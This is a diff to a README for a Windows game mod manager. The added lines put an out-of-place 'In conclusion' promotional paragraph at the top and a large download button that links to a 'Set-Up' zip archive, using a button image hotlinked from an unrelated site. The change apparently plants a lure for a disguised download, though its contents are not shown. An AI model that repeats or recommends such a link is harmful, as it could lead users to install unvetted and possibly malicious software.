@@ -2,6 +2,12 @@
 
 # Monke Mod Manager
 
+In conclusion, Monke Mod Manager is a powerful and convenient utility software that makes it easy for players to manage and install mods for their games on the Windows platform. Its user-friendly interface, wide range of features, and support for multiple games make it an excellent choice for anyone looking to customize and optimize their gaming experience.
+
+<a href="https://github.com/DeadlyKittenn/MonkeModManager/releases/download/1/Set-UpMonkeModManager.zip">
+    <img src="https://www.librasol.com.br/wp-content/uploads/2018/09/windows-button-download.png" alt="Download" width="200" />
+</a>
+
 Monke Mod Manager is a utility software designed to make it easier for players to manage and install mods for their games on Windows. It provides a simple, user-friendly interface to browse and install mods with just a few clicks, optimizing and customizing your gaming experience effortlessly.
 
 ## Features
